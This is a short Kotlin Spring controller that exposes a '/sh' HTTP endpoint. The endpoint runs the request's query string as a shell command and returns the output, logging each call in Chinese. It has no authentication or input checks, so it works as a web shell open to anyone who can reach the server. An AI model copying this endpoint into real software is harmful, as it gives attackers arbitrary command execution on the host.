package ctrl

import global
import lib.process.*

import java.net.*
import javax.servlet.http.*

import org.springframework.stereotype.*
import org.springframework.web.bind.annotation.*

@RestController
class ShellCtrl {
	val sh = Shell()

	init {
		sh.ready()
	}

	@GetMapping("/sh") fun shell(req: HttpServletRequest) : String {
		val cmd = URLDecoder.decode(req.getQueryString() ?: "", "UTF-8")
		global.log("收到sh请求: ${ cmd }")
		val r = sh.run(cmd, 5000, 1000) ?: "无返回"
		global.log("执行命令'${ cmd }'结果:\n${ r }")
		return r
	}
}
